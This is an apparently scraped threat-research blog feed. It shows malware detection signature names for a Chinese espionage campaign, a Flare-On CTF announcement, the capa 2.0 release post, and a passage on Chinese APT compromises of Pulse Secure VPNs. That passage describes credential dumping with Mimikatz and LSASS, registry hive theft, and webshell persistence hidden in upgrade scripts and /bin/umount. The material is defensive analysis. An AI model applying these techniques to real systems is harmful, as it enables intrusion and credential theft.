          <li>FE_Trojan_Raw32_SILKWRAP_1</li>
          <li>FE_Autopatt_Win_FOCUSFJORD</li> <li>Trojan.Generic</li>
          <li>FE_Tool_Win_Generic_3</li>
          <li>FE_Tool_Win32_Generic_3</li>
          <li>FE_Trojan_Win_Generic_154</li>
          <li>FE_Trojan_Win32_Generic_403</li>
          <li>FE_Trojan_Win_Generic_155</li>
          <li>FE_Trojan_Win64_Generic_54</li>
          <li>FE_APT_Backdoor_Win32_HYPERBRO_2</li>
          <li>FE_Trojan_Win32_Generic_404</li>
          <li>FE_Trojan_Win32_Generic_406</li> <li>Suspicious File
          Config</li> <li>Suspicious Regkey Added</li> <li>Suspicious
            Process Launch Activity</li> <li>Suspicious Codeinjection
          Activity</li> <li>Suspicious Process Delete Activity</li>
            <li>Suspicious Process Hijacking Activity</li>
            <li>Suspicious Process Self Deletion Activity</li> </ul>
      </td> </tr>
    <tr>
      <td><p>Endpoint Security</p> </td> <td><ul>
          <li>Generic.mg.a0b2193362152053</li>
          <li>Generic.mg.26d079e3afb08af0</li>
          <li>Generic.mg.28ce8dbdd2b7dfd1</li>
          <li>Generic.mg.04c51909fc65304d</li>
          <li>Generic.mg.0e061265c0b59980</li>
          <li>Generic.mg.09ffc31a432f646e</li>
          <li>Generic.mg.6ca8993b341bd90a</li>
          <li>Generic.mg.0ec4d0a477ba21bd</li>
          <li>Generic.mg.04dece2662f648f6</li>
          <li>Trojan.GenericKD.43427954</li>
          <li>Gen:Variant.Ursu.933105</li>
          <li>Trojan.GenericKD.32762213</li>
          <li>Trojan.GenericKD.34854595</li>
          <li>Gen:Variant.Ursu.256631</li>
          <li>Gen:Variant.Doina.16603</li>
          <li>Gen:Variant.Doina.13437</li> </ul> </td> </tr>
    <tr>
      <td><p>Helix</p> </td> <td><ul>
          <li>1.1.2927.fireeye_intel_hit_ip</li>
          <li>1.1.2928.fireeye_intel_hit_ip</li>
          <li>1.1.2929.fireeye_intel_hit_ip</li>
          <li>1.1.2930.fireeye_intel_hit_ip</li>
          <li>1.1.2947.fireeye_intel_hit_hash</li>
          <li>1.1.2948.fireeye_intel_hit_hash</li>
          <li>1.1.2949.fireeye_intel_hit_hash</li>
          <li>1.1.2950.fireeye_intel_hit_hash</li>
          <li>1.1.1404.windows_methodology_unusual_web_server_child_process</li>
          <li>1.1.3506.windows_methodology_adfind</li>
          <li>1.1.1650.windows_methodology_mimikatz_args</li>
          <li>1.1.1651.antivirus_methodology_mimikatz</li>
          <li>1.1.1652.windows_methodology_invokemimikatz_powershell_artifacts</li>
        </ul> </td> </tr></tbody></table>
http://www.fireeye.com/blog/threat-research/2021/08/unc215-chinese-espionage-campaign-in-israel.html2021-08-10T15:00:00.000Z2021-08-12T16:18:49.899ZAnnouncing the Eighth Annual Flare-On Challengenoemail@noemail.orgNick Harbour<p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/flare-on8/flare-on8.png"
    alt="" class="float-right-small" />The FLARE team is once again
  hosting its annual Flare-On challenge, now in its eighth year. Take
  this opportunity to enjoy some extreme social distancing by solving
  fun puzzles to test your mettle and learn new tricks on your path to
  reverse engineering excellence. The contest will begin at 8:00 p.m. ET
  on Sept. 10, 2021. This is a CTF-style challenge for all active and
  aspiring reverse engineers, malware analysts, and security
  professionals. The contest runs for six full weeks and ends at 8:00
  p.m. ET on Oct. 22, 2021.</p>
 <p>This year’s contest will consist of 10 challenges and feature a
  variety of formats, including Windows, Linux, and JavaScript. This is
  one of the only Windows-centric CTF contests out there and we have
  crafted it to represent the skills and challenges our FLARE team faces.</p>
 <p>If you smash your way through all 10 challenges, you will receive a
  prize and permanent recognition on the Flare-On website to honor your
  greatness. Prize details will be revealed later, but as always, it
  will be worthwhile swag to earn the envy of your peers. Prior year’s
  prizes were belt buckles, a replica police badge, a challenge coin, a
  medal, a massive pin, and a cyber-styled skeleton key.</p>
 <p>Check the <a href="http://flare-on.com/">Flare-On website</a> for a
  live countdown timer, to view the previous year’s winners, and to
  download past challenges and solutions for practice. For official news
  and information, we will be using the Twitter hashtag: #flareon8.</p>
http://www.fireeye.com/blog/threat-research/2021/08/announcing-the-eighth-annual-flare-on-challenge.html2021-08-12T15:30:00.000Z2021-08-12T14:57:47.117Zcapa 2.0: Better, Faster, Strongernoemail@noemail.orgWilliam Ballenthin<p>We are excited to announce version 2.0 of our open-source tool called
  capa. capa automatically identifies capabilities in programs using an
  extensible rule set. The tool supports both malware triage and deep
  dive reverse engineering. If you haven’t heard of capa before, or need
  a refresher, check out our <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/07/capa-automatically-identify-malware-capabilities.html">first
    blog post</a>. You can download capa 2.0 standalone binaries from
  the project’s <a
    href="https://github.com/fireeye/capa/releases">release page</a> and
  checkout the source code on <a href="https://github.com/fireeye/capa">GitHub</a>.</p>
 <p>capa 2.0 enables anyone to contribute rules more easily, which makes
  the existing ecosystem even more vibrant. This blog post details the
  following major improvements included in capa 2.0:</p>
 <ul> <li>New features and enhancements for the <a
      href="https://github.com/fireeye/capa/tree/master/capa/ida/plugin">capa
    explorer</a> IDA Pro plugin, allowing you to interactively explore
    capabilities and write new rules without switching windows</li>
    <li>More concise and relevant results via identification of library
    functions using FLIRT and the release of accompanying open-source
    FLIRT signatures</li> <li>Hundreds of new rules describing
    additional malware capabilities, bringing the collection up to 579
    total rules, with more than half associated with ATT&amp;CK
  techniques</li> <li>Migration to Python 3, to make it easier to
    integrate capa with other projects</li> </ul>
 <h4>capa explorer and Rule Generator</h4>
 <p>capa explorer is an IDAPython plugin that shows capa results
  directly within IDA Pro. The version 2.0 release includes many
  additions and improvements to the plugin, but we'd like to highlight
  the most exciting addition: capa explorer now helps you write new capa
  rules directly in IDA Pro!</p>
 <p>Since we spend most of our time in reverse engineering tools such as
  IDA Pro analyzing malware, we decided to add a capa rule generator.
  Figure 1 shows the rule generator interface.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa-2/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: capa explorer rule generator interface</span></p>
 <p>Once you’ve installed capa explorer using the <a
    href="https://github.com/fireeye/capa/tree/master/capa/ida/plugin#getting-started">Getting
  Started</a> guide, open the plugin by navigating to <i>Edit </i>&gt;
    <i>Plugins </i>&gt; <i>FLARE capa explorer</i>. You can start using
  the rule generator by selecting the <i>Rule Generator</i> tab at the
  top of the capa explorer pane. From here, navigate your IDA Pro
  Disassembly view to the function containing a technique you'd like to
  capture and click the <i>Analyze</i> button. The rule generator will
  parse, format, and display all the capa features that it finds in your
  function. You can write your rule using the rule generator's three
  main panes: <i>Features</i>, <i>Preview</i>, and <i>Editor</i>. Your
  first step is to add features from the <i>Features</i> pane.</p>
 <p>The <i>Features</i> pane is a tree view containing all the capa
  features extracted from your function. You can filter for specific
  features using the search bar at the top of the pane. Then, you can
  add features by double-clicking them. Figure 2 shows this in action.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa-2/fig2.gif" alt="" />
  <br /> <span class="type-XS">Figure 2: capa explorer feature selection</span></p>
 <p>As you add features from the <i>Features</i> pane, the rule
  generator automatically formats and adds them to the <i>Preview</i>
  and <i>Editor</i> panes. The <i>Preview</i> and <i>Editor</i> panes
  help you finesse the features that you've added and allow you to
  modify other information like the rule's metadata.</p>
 <p>The <i>Editor</i> pane is an interactive tree view that displays the
  statement and feature hierarchy that forms your rule. You can reorder
  nodes using drag-and-drop and edit nodes via right-click context
  menus. To help humans understand the rule logic, you can add
  descriptions and comments to features by typing in the
  <i>Description</i> and <i>Comment</i> columns. The rule generator
  automatically formats any changes that you make in the <i>Editor</i>
  pane and adds them to the <i>Preview</i> pane. Figure 3 shows how to
  manipulate a rule using the <i>Editor</i> pane.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa-2/fig3.gif" alt="" />
  <br /> <span class="type-XS">Figure 3: capa explorer editor pane</span></p>
 <p>The <i>Preview</i> pane is an editable textbox containing the final
  rule text. You can edit any of the text displayed. The rule generator
  automatically formats any changes that you make in the <i>Preview</i>
  pane and adds them to the <i>Editor</i> pane. Figure 4 shows how to
  edit a rule directly in the <i>Preview </i>pane.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa-2/fig4.gif" alt="" />
  <br /> <span class="type-XS">Figure 4: capa explorer preview pane</span></p>
 <p>As you make edits the rule generator lints your rule and notifies
  you of any errors using messages displayed underneath the <i>Preview
  </i>pane. Once you've finished writing your rule you can save it to
  your capa rules directory by clicking the <i>Save</i> button. The rule
  generator saves exactly what is displayed in the <i>Preview </i>pane.
  It’s that simple!</p>
 <p>We’ve found that using the capa explorer rule generator
  significantly reduces the amount of time spent writing new capa rules.
  This tool not only automates most of the rule writing process but also
  eliminates the need to context switch between IDA Pro and your
  favorite text editor allowing you to codify your malware knowledge
  while it’s fresh in your mind.</p>
 <p>To learn more about capa explorer and the rule generator check out
  the <a href="https://github.com/fireeye/capa/tree/master/capa/ida/plugin">README</a>.</p>
 <h4>Library Function Identification Using FLIRT</h4>
 <p>As we wrote hundreds of capa rules and inspected thousands of capa
  results, we recognized that the tool sometimes shows distracting
  results due to embedded library code. We believe that capa needs to
  focus its attention on the programmer’s logic and ignore supporting
  library code. For example, highly optimized C/C++ runtime routines and
  open-source library code enable a programmer to quickly build a
  product but are not the <i>product itself</i>. Therefore, capa results
  should reflect the programmer’s intent for the program rather than a
  categorization of every byte in the program.</p>
 <p>Compare the capa v1.6 results in Figure 5 versus capa v2.0 results
  in Figure 6. capa v2.0 identifies and skips almost 200 library
  functions and produces more relevant results.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa-2/fig5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: capa v1.6 results without
    library code recognition</span></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa-2/fig6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: capa v2.0 results ignoring
    library code functions</span></p>
 <p>So, we searched for a way to differentiate a programmer’s code from
  library code.</p>
 <p>After experimenting with a few strategies, we landed upon the Fast
  Library Identification and Recognition Technology (FLIRT) <a
    href="https://hex-rays.com/products/ida/tech/flirt/in_depth/">developed
    by Hex-Rays</a>. Notably, this technique has remained stable and
  effective since 1996, is fast, requires very limited code analysis,
  and enjoys a wide community in the IDA Pro userbase. We figured out
  how IDA Pro matches FLIRT signatures and <a
    href="https://crates.io/crates/lancelot-flirt">re-implemented a
    matching engine in Rust</a> with <a
    href="https://pypi.org/project/python-flirt/">Python bindings</a>.
  Then, we built an <a
    href="https://github.com/fireeye/siglib/">open-source signature
  set</a> that covers many of the library routines encountered in modern
  malware. Finally, we updated capa to use the new signatures to guide
  its analysis.</p>
 <p>capa uses these signatures to differentiate library code from a
  programmer’s code. While capa can extract and match against the names
  of embedded library functions, it will skip finding capabilities and
  behaviors within the library code. This way, capa results better
  reflect the logic written by a programmer.</p>
 <p>Furthermore, library function identification drastically improves
  capa runtime performance: since capa skips processing of library
  functions, it can avoid the costly rule matching steps across a
  substantial percentage of real-world functions. Across our testbed of
  206 samples, 28% of the 186,000 total functions are recognized as
  library code by our function signatures. As our implementation can
  recognize around 100,000 functions/sec, library function
  identification overhead is negligible and capa is approximately 25%
  faster than in 2020!</p>
 <p>Finally, we introduced a new feature class that rule authors can use
  to match recognized library functions: <span
  class="code">function-name</span>. This feature matches at the
  file-level scope. We’ve already started using this new capability to
  recognize specific implementations of cryptography routines, such as
  AES provided by <a href="https://www.cryptopp.com/">Crypto++</a>, as
  shown in the example rule in Figure 7.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa-2/fig7.png" alt="" />
  <br /> <span class="type-XS">Figure 7: Example rule using
    function-name to recognize AES via Crypto++</span></p>
 <p>As we developed rules for interesting behaviors, we learned a lot
  about where uncommon techniques are used legitimately. For example, as
  malware analysts, we most commonly see the <span
  class="code">cpuid</span> instruction alongside anti-analysis checks,
  such as in VM detection routines. Therefore, we naively crafted rules
  to flag this instruction. But, when we tested it against our testbed,
  the rule matched most modern programs because this instruction is
  often legitimately used in high-optimized routines, such as <span
  class="code">memcpy</span>, to opt-in to newer CPU features. In
  hindsight, this is obvious, but at the time it was a little surprising
  to see <span class="code">cpuid</span> in around 15% of all
  executables. With the new FLIRT support, capa recognizes the optimized
    <span class="code">memcpy</span> routine embedded by Visual Studio
  and won’t flag the embedded <span class="code">cpuid</span>
  instruction, as it's not part of the programmer’s code.</p>
 <p>When a user upgrades to capa 2.0, they’ll see that the tool runs
  faster and provides more precise results.</p>
 <h4>Signature Generation</h4>
 <p>To provide the benefits of <a
  href="https://pypi.org/project/python-flirt/">python-flirt</a> to all
  users (especially those without an IDA Pro license) we have spent
  significant time to create a comprehensive FLIRT signature set for the
  common malware analysis use-case. The signatures come included with
  capa and are also available at <a
    href="https://github.com/fireeye/siglib">our GitHub</a> under the
  Apache 2.0 license. We believe that other projects can benefit greatly
  from this. For example, we expect the performance of <a
  href="https://github.com/fireeye/flare-floss">FLOSS</a> to improve
  once we’ve incorporated library function identification. Moreover, you
  can use our signatures with IDA Pro to recognize more library code.</p>
 <p>Our initial signatures include:</p>
 <ul> <li>From Microsoft Visual Studio (VS), for all major versions from
    VS6 to VS2019:<ul> <li>C and C++ run-time libraries</li> <li>Active
        Template Library (ATL) and Microsoft Foundation Class (MFC)
      libraries</li> </ul> </li> <li>The following open-source projects
    as compiled with VS2015, VS2017, and VS2019:<ul> <li>CryptoPP</li>
      <li>curl</li> <li>Microsoft Detours</li> <li>Mbed TLS (previously
      PolarSSL)</li> <li>OpenSSL</li> <li>zlib</li> </ul> </li> </ul>
 <p>Identifying and collecting the relevant library and object files
  took a lot of work. For the older VS versions this was done manually.
  For newer VS versions and the respective open-source projects we were
  able to automate the process using <a
  href="https://vcpkg.io">vcpgk</a> and Docker.</p>
 <p>We then used the IDA Pro FLAIR utilities to convert gigabytes of
  executable code into pattern files and then into signatures. This
  process required extensive research and much trial and error. For
  instance, we spent two weeks testing and exploring the various FLAIR
  options to understand the best combination. We appreciate Hex-Rays for
  providing high-quality signatures for IDA Pro and thank them for
  sharing their research and tools with the community.</p>
 <p>To learn more about the pattern and signature file generation check
  out the <a href="https://github.com/fireeye/siglib">siglib</a>
  repository. The FLAIR utilities are available in the protected
  download area on <a
    href="https://www.hex-rays.com/products/ida/support/download/">Hex-Rays’ website</a>.</p>
 <h4>Rule Updates</h4>
 <p>Since the initial release, the community has more than doubled the
  total capa rule count from 260 to over <a
    href="https://github.com/fireeye/capa-rules">570 capability
    detection rules</a>! This means that capa recognizes many more
  techniques seen in real-world malware, certainly saving analysts time
  as they reverse engineer programs. And to reiterate, we’ve surfed a
  wave of support as almost 30 colleagues from a dozen organizations
  have volunteered their experience to develop these rules. Thank you!</p>
 <p>Figure 8 provides a high-level overview of capabilities capa
  currently captures, including:</p>
 <ul> <li>
    <b>Host Interaction </b>describes program functionality to interact
    with the file system, processes, and the registry</li> <li>
    <b>Anti-Analysis</b> describes packers, Anti-VM, Anti-Debugging, and
    other related techniques</li> <li>
    <b>Collection</b> describes functionality used to steal data such as
    credentials or credit card information</li> <li>
    <b>Data Manipulation</b> describes capabilities to encrypt, decrypt,
    and hash data</li> <li>
    <b>Communication</b> describes data transfer techniques such as
    HTTP, DNS, and TCP</li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa-2/fig8.png" alt="" />
  <br /> <span class="type-XS">Figure 8: Overview of capa rule categories</span></p>
 <p>More than half of capa’s rules are associated with a <a
    href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> technique
  including all techniques introduced in ATT&amp;CK <a
    href="https://medium.com/mitre-attack/attack-april-2021-release-39accaf23c81">version
  9</a> that lie within capa’s scope. Moreover, almost half of the capa
  rules are currently associated with a <a
    href="https://github.com/MBCProject/mbc-markdown">Malware Behavior
  Catalog</a> (MBC) identifier.</p>
 <p>For more than 70% of capa rules we have collected associated
  real-world binaries. Each binary implements interesting capabilities
  and exhibits noteworthy features. You can view the entire sample
  collection at our <a
    href="https://github.com/fireeye/capa-testfiles">capa test files
    GitHub page</a>. We rely heavily on these samples for developing and
  testing code enhancements and rule updates.</p>
 <h4>Python 3 Support</h4>
 <p>Finally, we’ve spent nearly three months migrating capa from Python
  2.7 to Python 3. This involved working closely with <a
  href="https://github.com/vivisect/vivisect">vivisect</a> and we would
  like to thank the team for their support. After extensive testing and
  a couple of releases supporting two Python versions, we’re excited
  that capa 2.0 and future versions will be Python 3 only.</p>
 <h4>Conclusion</h4>
 <p>Now that you’ve seen all the recent improvements to capa, we hope
  you’ll upgrade to the newest capa version right away! Thanks to
  library function identification capa will report faster and more
  relevant results. Hundreds of new rules capture the most interesting
  malware functionality while the improved capa explorer plugin helps
  you to focus your analysis and codify your malware knowledge while
  it’s fresh.</p>
 <p>Standalone binaries for Windows, Mac, and Linux are available on the
    <a href="https://github.com/fireeye/capa/releases">capa Releases
  page</a>. To install capa from <a
  href="https://pypi.org/project/flare-capa/">PyPi</a> use the command
    <span class="code">pip install flare-capa</span>. The source code is
  available at our <a href="https://github.com/fireeye/capa">capa GitHub
  page</a>. The project page on GitHub contains detailed documentation,
  including thorough <a
  href="https://github.com/fireeye/capa/blob/master/doc/installation.md">installation</a>
  instructions and a walkthrough of <a
    href="https://github.com/fireeye/capa/blob/master/capa/ida/plugin/README.md">capa
  explorer</a>. Please use <a
  href="https://github.com/fireeye/capa/issues">GitHub</a> to ask
  questions, discuss ideas, and submit issues.</p>
 <p>We highly encourage you to contribute to capa’s rule corpus. The
  improved IDA Pro plugin makes it easier than ever before. If you have
  any issues or ideas related to rules, please let us know on the <a
    href="https://github.com/fireeye/capa-rules">GitHub repository</a>.
  Remember, when you share a rule with the community, you scale your
  impact across hundreds of reverse engineers in dozens of organizations.</p>
http://www.fireeye.com/blog/threat-research/2021/07/capa-2-better-stronger-faster.html2021-07-19T18:00:00.000Z2021-08-03T15:39:20.221ZRe-Checking Your Pulse: Updates on Chinese APT Actors Compromising Pulse
Secure VPN Devicesnoemail@noemail.orgDan Perez<p>On April 20, 2021, Mandiant published detailed results of our
  investigations into <a
    href="/content/fireeye-www/en_US/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html">compromised
    Pulse Secure devices by suspected Chinese espionage operators</a>.
  This blog post is intended to provide an update on our findings, give
  additional recommendations to network defenders, and discuss potential
  implications for U.S.-China strategic relations.</p>
 <ul> <li>Mandiant continues to gather evidence and respond to
    intrusions involving compromises of Pulse Secure VPN appliances at
    organizations across the defense, government, high tech,
    transportation, and financial sectors in the U.S. and Europe (Figure
  1).</li> <li>Reverse engineers on the FLARE team have identified four
    additional code families specifically designed to manipulate Pulse
    Secure devices. </li> <li>We now assess that espionage activity by
    UNC2630 and UNC2717 supports key Chinese government priorities. Many
    compromised organizations operate in verticals and industries
    aligned with Beijing’s strategic objectives outlined in China’s
    recent 14th Five Year Plan.</li> <li>While there is evidence of data
    theft at many organizations, we have not directly observed the
    staging or exfiltration of any data by Chinese espionage actors that
    could be considered a violation of the Obama-Xi <a
  href="https://obamawhitehouse.archives.gov/the-press-office/2015/09/25/fact-sheet-president-xi-jinpings-state-visit-united-states">agreement</a>.</li>
    <li>Mandiant Threat Intelligence assesses that Chinese cyber
    espionage activity has demonstrated a higher tolerance for risk and
    is less constrained by diplomatic pressures than previously
  characterized.</li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/pulse-update/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Organizations with compromised
    Pulse Secure devices by vertical and geographic location</span></p>
 <p>Pulse Secure continues to work closely with Mandiant, affected
  customers, government partners, and other forensic experts to address
  these issues. Pulse Secure’s parent company, Ivanti, has released
  patches to proactively address software vulnerabilities and issued
  updated <a
    href="https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784">Security
    Advisories</a> and <a
  href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755">Knowledge Articles</a>
  to assist customers. (Please see the Forensics, Remediation, and
  Hardening Guidelines section for additional details.)</p>
 <h4>UNC2630 and UNC2717 Tradecraft and Response to Disclosure</h4>
 <p>Mandiant is tracking 16 malware families exclusively designed to
  infect Pulse Secure VPN appliances and used by several cyber espionage
  groups which we believe are affiliated with the Chinese government.
  Between April 17 and April 20, 2021, Mandiant incident responders
  observed UNC2630 access dozens of compromised devices and remove
  webshells like ATRIUM and SLIGHTPULSE.</p>
 <ul> <li>Under certain conditions, the Integrity Checker Tool (ICT)
    will show no evidence of compromise on appliances which may have had
    historical compromise. This false negative may be returned because
    the ICT cannot scan the rollback partition. If a backdoor or
    persistence patcher exists on the rollback partition and a Pulse
    Secure appliance is rolled back to the prior version, the
    backdoor(s) will be present on the appliance. Please see the
    Forensics, Remediation, and Hardening Guidelines section for
    important information regarding the ICT and upgrade process.</li>
    <li>In at least one instance, UNC2630 deleted their webshell(s) but
    did not remove the persistence patcher, making it possible to regain
    access when the device was upgraded.  The remaining persistence
    patcher causes the malicious code to be executed later during a
    system upgrade, re-inserts webshell logic into various files on the
    appliance, and recompromises the device.</li> <li>It is unusual for
    Chinese espionage actors to remove a large number of backdoors
    across several victim environments on or around the time of public
    disclosure. This action displays an interesting concern for
    operational security and a sensitivity to publicity.<br /> </li> </ul>
 <p>Both UNC2630 and UNC2717 display advanced tradecraft and go to
  impressive lengths to avoid detection. The actors modify file
  timestamps and regularly edit or delete forensic evidence such as
  logs, web server core dumps, and files staged for exfiltration. They
  also demonstrate a deep understanding of network appliances and
  advanced knowledge of a targeted network. This tradecraft can make it
  difficult for network defenders to establish a complete list of tools
  used, credentials stolen, the initial intrusion vector, or the
  intrusion start date.</p>
 <h4>Updates from Incident Response Investigations</h4>
 <p>We continue to suspect that multiple groups including UNC2630 and
  UNC2717 are responsible for this activity, despite the use of similar
  exploits and tools. There is a high degree of variation in attacker
  actions within victim environments, with actors inconsistently using a
  combination of tools and command and control IP addresses.</p>
 <p>Reverse engineers on the FLARE team have identified four additional
  malware families specifically designed to manipulate Pulse Secure
  devices (Table 1). These utilities have similar functions to the 12
  previously documented malware families: harvesting credentials and
  sensitive system data, allowing arbitrary file execution, and removing
  forensic evidence. Please see the Technical Annex for detailed
  analysis of these code families.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="113" valign="top"><p>
          <b>Malware Family</b></p> </td> <td width="418" valign="top"><p>
          <b>Description</b></p> </td> <td width="78" valign="top"><p>
          <b>Actor</b></p> </td> </tr>
    <tr>
      <td width="113" valign="top"><p>BLOODMINE</p> <p> </p> </td> <td
        width="418" valign="top"><p>BLOODMINE is a utility for parsing
          Pulse Secure Connect log files. It extracts information
          related to logins, Message IDs and Web Requests and copies the
          relevant data to another file.</p> </td> <td width="78"
        valign="top"><p>UNC2630</p> </td> </tr>
    <tr>
      <td width="113" valign="top"><p>BLOODBANK</p> <p> </p> </td> <td
        width="418" valign="top"><p>BLOODBANK is a credential theft
          utility that parses two files containing password hashes or
          plaintext passwords and expects an output file to be given at
          the command prompt.</p> </td> <td width="78"
        valign="top"><p>UNC2630</p> </td> </tr>
    <tr>
      <td width="113" valign="top"><p>CLEANPULSE</p> <p> </p> </td> <td
        width="418" valign="top"><p>CLEANPULSE is a memory patching
          utility that may be used to prevent certain log events from
          occurring. It was found in close proximity to an ATRIUM
        webshell.</p> </td> <td width="78" valign="top"><p>UNC2630</p>
      </td> </tr>
    <tr>
      <td width="113" valign="top"><p>RAPIDPULSE</p> <p> </p> </td> <td
        width="418" valign="top"><p>RAPIDPULSE is a webshell capable of
          arbitrary file read. As is common with other webshells,
          RAPIDPULSE exists as a modification to a legitimate Pulse
          Secure file. RAPIDPULSE can serve as an encrypted file
          downloader for the attacker.</p> </td> <td width="78"
        valign="top"><p>UNC2630</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 1: New malware families identified</span></p>
 <p>
  <i>Initial Compromise</i></p>
 <p>The actors leveraged several vulnerabilities in Pulse Secure VPN
  appliances. Mandiant observed the use of the recently patched
  vulnerability CVE-2021-22893 to compromise fully patched Pulse Secure
  appliances as well as previously disclosed vulnerabilities from 2019
  and 2020. In many cases, determining the initial exploitation vector
  and timeframe was not possible to determine because the actors altered
  or deleted forensic evidence, or the appliance had undergone
  subsequent code upgrades thereby destroying evidence related to the
  initial exploitation.</p>
 <p>
  <i>Establish Foothold</i></p>
 <p>In some cases, Mandiant observed the actors create their own Local
  Administrator account outside of established credential management
  controls on Windows servers of strategic value. This allowed the actor
  to maintain access to systems with short-cycle credential rotation
  policies and provided a sufficient level of access to operate freely
  within their target environment. The actors also maintained their
  foothold into the targeted environments exclusively through Pulse
  Secure webshells and malware without relying on backdoors deployed on
  internal Windows or Linux endpoints.</p>
 <p>
  <i>Escalate Privileges</i></p>
 <p>Mandiant observed the actors use three credential harvesting
  techniques on Windows systems:</p>
 <ul> <li>Targeting of clear text passwords and hashes from memory using
    the credential harvesting tool Mimikatz. Instead of being copied
    locally and executed on the target system, Mandiant saw evidence of
    the Mimikatz binary on the source system of an RDP session (i.e. the
    threat actor’s system that was connected to the VPN) through an RDP
    mapped drive.</li> <li>Copying and exfiltration of the SAM,
    SECURITY, and SYSTEM registry hives which contained cached NTLM
    hashes for Local and Domain accounts.</li> <li>Leveraging the
    Windows Task Manager process to target the Local Security Authority
    Subsystem Service (LSASS) process memory for NTLM hashes.</li> </ul>
 <p>In addition to these privilege escalation techniques, the actors
  specifically targeted separate privileged accounts belonging to
  individuals whose unprivileged accounts were previously compromised
  (likely through the Pulse Secure credential harvesting malware
  families). It is unclear how the account associations were made by the actor.</p>
 <p>
  <i>Internal Reconnaissance</i></p>
 <p>Mandiant found evidence that the actors renamed their own
  workstations that they connected to the VPN of victim networks to
  mimic the naming convention of their target environment. This practice
  aligns with the actor’s objective for long-term persistence and
  evading detection and demonstrates a familiarity with the internal
  hostnames in the victim environment.</p>
 <p>The actors operated solely by utilizing Windows-based utilities to
  carry out tasks. Some of the utilities observed were net.exe,
  quser.exe, powershell.exe, powershell_ise.exe, findstr.exe,
  netstat.exe, cmd.exe, reg.exe and tasklist.exe.</p>
 <p>
  <i>Move Laterally</i></p>
 <p>Most lateral movement originated from compromised Pulse Secure VPN
  appliances to internal systems within the environment.  While
  connected to the Pulse VPN appliance, the actor’s system was assigned
  an IP address from the Pulse VPN DHCP pool and they moved laterally
  throughout the environments by leveraging the Remote Desktop Protocol
  (RDP), the Secure Shell Protocol (SSH), and browser-based
  communication to HTTPS hosted resources. The actors also accessed
  other resources such as Microsoft M365 cloud environments using stolen
  credentials they had previously acquired.</p>
 <p>Mandiant also observed the actors targeting ESXi host servers. The
  actor enabled SSH on ESXi hosts that were previously disabled via the
  web interface. When their operations on the system were finished, the
  actors disabled SSH on the ESXi host again and cleared or preemptively
  disabled all relevant logging associated with the performed
  activities. This includes authentication, command history, and message
  logging on the system.</p>
 <p>
  <i>Maintain Presence</i></p>
 <p>Mandiant observed the threat actor maintain persistence by
  compromising the upgrade process on the Pulse Secure Appliance. 
  Persistence was primarily achieved by modifying the legitimate
  DSUpgrade.pm file to install the ATRIUM webshell across each upgrade
  performed by an administrator.  The actor likely chose DSUpgade.pm to
  host their patch logic as it is a core file in the system upgrade
  procedure, ensuring the patch is applied during updates. The patcher
  modifies content in /tmp/data as this directory holds the extracted
  upgrade image the newly upgraded system will boot into. This results
  in a persistence mechanism which allows the actor to maintain access
  to the system across updates.</p>
 <p>The actors also achieved persistence in other cases by prepending a
  bash script to the file /bin/umount normally used to unmount a Linux
  filesystem. This binary was targeted by the actor because it is
  executed by the Pulse Secure appliance during a system upgrade. The
  actor’s script verifies that the umount binary executes with a
  specific set of arguments, which are identical to the arguments used
  by the Pulse Secure appliance to executes the binary. The inserted
  malicious bash script remounts the filesystem as read-write and
  iterates through a series of bash routines to inject the ATRIUM
  webshell, hide SLOWPULSE from a legacy file integrity bash script,
  remove or add itself from the umount file, and validate the web
  process was running after a reboot to return the filesystem back to read-only.</p>
 <p>
  <i>Complete Mission</i></p>
 <p>The threat actor’s objectives appear to be stealing credentials,
  maintaining long-term persistent access to victim networks, and
  accessing or exfiltrating sensitive data. Mandiant has observed the attackers:<i></i></p>
 <ul> <li>Staging data related to sensitive projects, often in
  C:\Users\Public</li> <li>Naming exfiltration archives to resemble
    Windows Updates (KB) or to match the format
  KB&lt;digits&gt;.zip</li> <li>Using the JAR/ZIP file format for data
  exfiltration</li> <li>Deleting exfiltrated archives</li> </ul>
 <p>Analysis of new malware families is included in the Technical Annex
  to enable defenders to quickly assess if their respective appliances
  have been affected. Relevant MITRE ATT&amp;CK techniques, Yara rules
  and hashes are published on <a
    href="https://github.com/fireeye/pulsesecure_exploitation_countermeasures">Mandiant’s
    GitHub page</a>.</p>
 <h4>Forensics, Remediation, and Hardening Guidelines</h4>
 <p>To begin an investigation, Pulse Secure users should contact their
  Customer Support Representative for assistance completing the
  following steps:</p>
 <ol> <li>Capture memory and a forensic image of the appliance</li>
    <li>Run the Pulse Integrity Checker Tool found online</li>
    <li>Request a decrypted image of each partition and a memory
  dump</li> </ol>
 <p>To remediate a compromised Pulse Secure appliance:  </p>
 <ol> <li>Caution must be taken when determining if a Pulse Secure
    device was compromised at any previous date. If the Integrity
    Checker Tool (ICT) was not run before the appliance was updated, the
    only evidence of compromise will exist in the system rollback
    partition which cannot be scanned by the ICT. If an upgrade was
    performed without first using the ICT, a manual inspection of the
    rollback partition is required to determine if the device was
    previously compromised.</li> <li>To ensure that no malicious logic
    is copied to a clean device, users must perform upgrades from the
